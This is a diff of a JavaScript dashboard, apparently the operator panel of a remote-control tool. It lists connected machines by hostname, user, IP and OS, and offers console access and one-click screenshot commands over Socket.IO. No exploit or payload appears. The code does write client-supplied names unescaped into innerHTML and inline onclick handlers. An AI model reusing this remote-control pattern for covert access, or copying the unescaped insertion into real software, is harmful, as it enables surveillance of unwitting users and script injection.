@@ -1,13 +1,14 @@
 // 仪表板专用JavaScript
 class Dashboard {
     constructor() {
-        this.socket = io();
+        this.socket = null;
         this.currentCommandForParam = "";
         this.messageHistory = [];
         this.maxHistory = 1000;
         this.lastTimeoutMessage = 0;
         this.timeoutMessageInterval = 5000;
         this.eventsInitialized = false;
+        this.isConnected = false; // 添加连接状态标记
         this.init();
     }
 
@@ -40,91 +41,209 @@ class Dashboard {
     }
 
     initializeSocket() {
-        if (this.socket && this.eventsInitialized) {
-            return; // 避免重复初始化
+        // 如果socket已经存在且已连接，不重复初始化
+        if (this.socket && this.socket.connected) {
+            return;
         }
         
-        // 只绑定一次事件监听器
-        if (!this.eventsInitialized) {
-            // 监听服务器发送的完整客户端列表
-            this.socket.on("clients_list", (data) => {
-                console.log("收到客户端列表:", data.clients);
-                if (data && data.clients) {
-                    this.updateClientDropdown(data.clients);
+        this.socket = io();
+
+        this.socket.on('connect', () => {
+            // 删除连接消息显示，直接执行连接后的操作
+            this.isConnected = true;
+            this.populateClientsInitial();
+        });
+
+        this.socket.on('disconnect', () => {
+            this.addFeedbackMessage('已与服务器断开连接');
+            this.isConnected = false;
+        });
+
+        this.socket.on('command_result', (data) => {
+            this.handleCommandResult(data);
+        });
+
+        this.socket.on('clients_list', (data) => {
+            this.updateClientList(data);
+        });
+
+        this.socket.on('new_client', (data) => {
+            this.addClient(data);
+            this.addFeedbackMessage(`新客户端已连接: ${data.hostname || data.client_id}`);
+        });
+
+        this.socket.on('client_updated', (data) => {
+            this.updateClient(data);
+            this.addFeedbackMessage(`客户端信息已更新: ${data.hostname || data.client_id}`);
+        });
+
+        this.socket.on('client_disconnected', (data) => {
+            this.removeClient(data.client_id);
+            this.addFeedbackMessage(`客户端已断开连接: ${data.client_id}`);
+        });
+
+        this.socket.on('new_screenshot', (data) => {
+            this.handleNewScreenshot(data);
+        });
+    }
+
+    populateClientsInitial() {
+        this.socket.emit('get_clients');
+    }
+
+    updateClientList(data) {
+        const select = document.getElementById('client-select');
+        const listContainer = document.getElementById('client-list');
+
+        if (select) {
+            const previouslySelected = select.value;
+            select.innerHTML = '';
+
+            if (!data || !data.clients || Object.keys(data.clients).length === 0) {
+                const option = document.createElement('option');
+                option.value = '';
+                option.textContent = '无在线客户端';
+                option.disabled = true;
+                select.appendChild(option);
+            } else {
+                const clientIds = Object.keys(data.clients);
+                clientIds.forEach(clientId => {
+                    const info = data.clients[clientId];
+                    const option = document.createElement('option');
+                    option.value = clientId;
+                    const displayName = info.hostname || `客户端 ${clientId}`;
+                    option.textContent = `${displayName} (${info.user || '未知'}) @ ${info.addr || '未知IP'}`;
+                    select.appendChild(option);
+                });
+
+                if (clientIds.includes(previouslySelected)) {
+                    select.value = previouslySelected;
                 } else {
-                    console.error("从服务器收到的客户端列表格式不正确:", data);
-                    this.updateClientDropdown({});
+                    select.value = clientIds[0];
                 }
-            });
+            }
+        }
 
-            // 监听新客户端连接
-            this.socket.on('new_client', (clientData) => {
-                console.log("新客户端连接:", clientData);
-                this.populateClientsInitial();
-            });
+        if (listContainer) {
+            listContainer.innerHTML = '';
+            if (!data || !data.clients || Object.keys(data.clients).length === 0) {
+                listContainer.innerHTML = '<p>暂无连接的客户端</p>';
+                return;
+            }
 
-            // 监听客户端信息更新
-            this.socket.on('client_updated', (clientData) => {
-                console.log("客户端信息更新:", clientData);
-                this.populateClientsInitial();
+            Object.keys(data.clients).forEach(clientId => {
+                const info = data.clients[clientId];
+                const card = this.createClientCard(clientId, info);
+                listContainer.appendChild(card);
             });
-
-            // 监听客户端断开连接
-            this.socket.on('client_disconnected', (data) => {
-                console.log("客户端断开连接:", data);
-                this.populateClientsInitial();
-            });
-
-            // 监听命令结果
-            this.socket.on("command_result", (data) => {
-                this.handleCommandResult(data);
-            });
-
-            // 监听截图事件
-            this.socket.on('new_screenshot', (data) => {
-                this.handleNewScreenshot(data);
-            });
-            
-            this.eventsInitialized = true;
         }
     }
 
-    updateClientDropdown(clientsData) {
-        const select = document.getElementById("client-select");
-        if (!select) return;
-        
-        const previouslySelected = select.value;
-        select.innerHTML = "";
+    addClient(clientInfo) {
+        const select = document.getElementById('client-select');
+        const listContainer = document.getElementById('client-list');
+        const clientId = clientInfo.client_id;
 
-        const clientIds = Object.keys(clientsData);
+        if (select) {
+            // 移除 "无在线客户端" 选项
+            const noClientsOption = select.querySelector('option[value=""]');
+            if (noClientsOption) {
+                noClientsOption.remove();
+            }
 
-        if (clientIds.length === 0) {
-            const option = document.createElement("option");
-            option.value = "";
-            option.text = "无在线客户端";
-            option.disabled = true;
+            const option = document.createElement('option');
+            option.value = clientId;
+            const displayName = clientInfo.hostname || `客户端 ${clientId}`;
+            option.textContent = `${displayName} (${clientInfo.user || '未知'}) @ ${clientInfo.addr || '未知IP'}`;
             select.appendChild(option);
-        } else {
-            clientIds.forEach((clientId) => {
-                const clientInfo = clientsData[clientId];
-                const option = document.createElement("option");
-                option.value = clientId;
+            if (select.options.length === 1) {
+                select.value = clientId;
+            }
+        }
+
+        if (listContainer) {
+            // 移除 "暂无连接的客户端" 提示
+            const noClientsMessage = listContainer.querySelector('p');
+            if (noClientsMessage) {
+                noClientsMessage.remove();
+            }
+            const card = this.createClientCard(clientId, clientInfo);
+            listContainer.appendChild(card);
+        }
+    }
+
+    updateClient(clientInfo) {
+        const select = document.getElementById('client-select');
+        const listContainer = document.getElementById('client-list');
+        const clientId = clientInfo.client_id;
+
+        if (select) {
+            const option = select.querySelector(`option[value="${clientId}"]`);
+            if (option) {
                 const displayName = clientInfo.hostname || `客户端 ${clientId}`;
-                option.innerHTML = `${displayName} (${clientInfo.user || '未知'}) @ ${clientInfo.addr || '未知IP'}`;
-                select.appendChild(option);
-            });
-            
-            if (clientIds.includes(previouslySelected)) {
-                select.value = previouslySelected;
-            } else if (clientIds.length > 0) {
-                select.value = clientIds[0];
+                option.textContent = `${displayName} (${clientInfo.user || '未知'}) @ ${clientInfo.addr || '未知IP'}`;
+            }
+        }
+
+        if (listContainer) {
+            const card = listContainer.querySelector(`.client-card[data-client-id="${clientId}"]`);
+            if (card) {
+                const newCard = this.createClientCard(clientId, clientInfo);
+                card.replaceWith(newCard);
             }
         }
     }
 
-    populateClientsInitial() {
-        console.log("请求客户端列表...");
-        this.socket.emit("get_clients");
+    removeClient(clientId) {
+        const select = document.getElementById('client-select');
+        const listContainer = document.getElementById('client-list');
+
+        if (select) {
+            const option = select.querySelector(`option[value="${clientId}"]`);
+            if (option) {
+                option.remove();
+            }
+            if (select.options.length === 0) {
+                const noClientsOption = document.createElement('option');
+                noClientsOption.value = '';
+                noClientsOption.textContent = '无在线客户端';
+                noClientsOption.disabled = true;
+                select.appendChild(noClientsOption);
+            }
+        }
+
+        if (listContainer) {
+            const card = listContainer.querySelector(`.client-card[data-client-id="${clientId}"]`);
+            if (card) {
+                card.remove();
+            }
+            if (listContainer.children.length === 0) {
+                listContainer.innerHTML = '<p>暂无连接的客户端</p>';
+            }
+        }
+    }
+
+    createClientCard(clientId, info) {
+        const card = document.createElement('div');
+        card.className = 'client-card';
+        card.dataset.clientId = clientId;
+        const title = info.hostname || `客户端 ${clientId}`;
+        card.innerHTML = `
+            <div class="client-card-header">
+              <span class="client-card-header"><i class='bx bx-laptop'></i> ${title}</span>
+              <span class="client-status online"><span class="status-dot"></span> 在线</span>
+            </div>
+            <div class="client-card-body">
+              <div><strong>用户：</strong>${info.user || '未知'}</div>
+              <div><strong>IP：</strong>${info.addr || '未知IP'}</div>
+              <div><strong>系统：</strong>${info.os || '未知'}</div>
+            </div>
+            <div class="client-card-actions">
+              <button class="btn btn-primary" onclick="window.location.href='/?client=${clientId}'"><i class='bx bx-terminal'></i> 控制台</button>
+              <button class="btn btn-success" onclick="dashboard.sendQuickCommand('screenshot', '', '${clientId}')"><i class='bx bx-camera'></i> 截屏</button>
+            </div>
+        `;
+        return card;
     }
 
     sendCommand() {
